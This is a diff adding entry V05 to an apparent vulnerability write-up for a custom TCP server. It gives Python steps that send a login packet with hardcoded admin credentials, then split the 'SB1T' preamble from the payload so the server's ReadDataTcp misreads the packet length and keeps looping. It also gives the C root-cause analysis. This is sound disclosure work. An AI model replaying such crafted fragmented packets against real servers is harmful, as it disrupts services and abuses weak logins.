@@ -184,10 +184,76 @@ V04) infinite loop in the NetworkTCP.cpp
 					return(length);
 				}
 
-V05) 
+V05) Unintentional handling of the protocol message
 	Compromise Sequence
-		
+		1. <normal case> execute python statements below. and confirm login success
+			>>> import socket
+			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			>>> s.connect(('192.168.0.228', 50000))
+			>>> s.sendall(b'\x53\x42\x31\x54\x1b\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00\x0a\x05\x61\x64\x6d\x69\x6e\x12\x02\x6c\x67') # send login protocol message with id:pass=admin:lg
+			
+		2. logout confirm by the statement below
+			>>> s.close()
+			
+		3. <NG case> execute python statements below. and login is not succeeded.
+			>>> import time
+			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			>>> s.connect(('192.168.0.228', 50000)) # connect to the server
+			>>> s.sendall(b'\x53\x42\x31\x54') # send preamble "SB1T" 1st
+			>>> time.sleep(1) # wait
+			>>> s.sendall(b'\x1b\x00\x00\x00\xc7\x8c\x07\x3c\xe8\x03\x00\x00\x0a\x05\x61\x64\x6d\x69\x6e\x12\x02\x6c\x67') # send remain payload to login
+	
 	Vulnerabilities
+		V05-1. The length parameter is set abnormally in case of sending the preamble "SB1T" only
+			CAPEC-494: TCP Fragmentation https://capec.mitre.org/data/definitions/494.html
 		
 	Approach
-		
+		V05-1. 
+			When receiving the 4bytes "SB1T" only and entering "if (i==0)" statement, the "MyPacket *p" is not filled enough.
+			Caller initializes the all memory pointing of data to zero. So in this case, only p->hdr.head is written to the data of the received packet and others are zero.
+			Finally, my_packet_size is changed to 0 and the next receiving data is not parsed correctly. And then keep looping until receiving the size of the value of 'length' input param.
+			
+			< NetworkTCP.cpp >
+			ssize_t ReadDataTcp(TTcpConnectedPort *TcpConnectedPort,unsigned char *data, size_t length) // all memory pointing of data is zero. length is PACKET_MAX_BUFFER_SIZE (=1024 * 1024)
+			{
+				ssize_t bytes;
+				ssize_t my_packet_size=-1;
+				ssize_t accumulated=0;
+
+				for (size_t i = 0; i < length; i += bytes)
+				{
+					if ((bytes = recv(TcpConnectedPort->ConnectedFd, (char *)(data+i), length  - i,0)) == -1)  // receiving 4 bytes "SB1T"
+					{
+						return (-1);
+					}
+					accumulated+=bytes;
+					if (i==0) {
+						MyPacket *p=(MyPacket*)data; // data is "SB1T\0\0\0\0\0\0\0...\0".
+						printf("max packet length=%zu received=%zu packet_length=%d timestamp=%u msgtype=%d\n", 
+									length, bytes, p->hdr.size , p->hdr.timestamp, p->hdr.msgtype);
+						if (p->hdr.head[0]=='S' && p->hdr.head[1]=='B' && p->hdr.head[2]=='1' && p->hdr.head[3]=='T') {
+							my_packet_size=p->hdr.size; // p->hdr.size is 0
+						}
+						// print_pkt_header(data,60);
+					}
+					...
+					if (my_packet_size>0 && accumulated>=my_packet_size) // when total received data is more than PACKET_MAX_BUFFER_SIZE, return the function.
+						return accumulated;
+				}
+				return(length);
+			}
+			
+			< ProtocolDef.h >
+			#pragma pack(push, 1)
+			typedef  struct {
+				unsigned char head[4];
+				uint32_t size;
+				uint32_t timestamp;
+				uint32_t msgtype;
+			} MyPacketHeader;
+
+			typedef  struct {
+				MyPacketHeader hdr;
+				unsigned char payload[0];
+			} MyPacket;
+			#pragma pack(pop)
